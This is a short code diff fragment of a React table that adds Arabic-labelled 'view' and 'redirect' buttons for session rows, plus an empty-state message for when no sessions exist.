+                      <div className="flex gap-2">
+                        <button
+                          onClick={() => setSelectedSession(s)}
+                          className="bg-blue-600 text-white px-3 py-1.5 rounded-lg text-xs font-bold shadow-sm hover:bg-blue-700 transition"
+                        >
+                          عرض
+                        </button>
+                        <button
+                          onClick={() => setRedirectSession(s)}
+                          className="bg-purple-50 text-purple-600 px-3 py-1.5 rounded-lg text-xs font-bold border border-purple-100 hover:bg-purple-100 transition"
+                        >
+                          توجيه
+                        </button>
+                      </div>
                     </td>
                   </tr>
                 ))}
+                {filteredSessions.length === 0 && (
+                  <tr>
+                    <td colSpan={6} className="px-6 py-12 text-center text-gray-400 text-sm">لا توجد عمليات حالية</td>
+                  </tr>
+                )}
               </tbody>
             </table>
           </div>
         </div>
-      </div>
+      </main>
     </div>
   );
 }
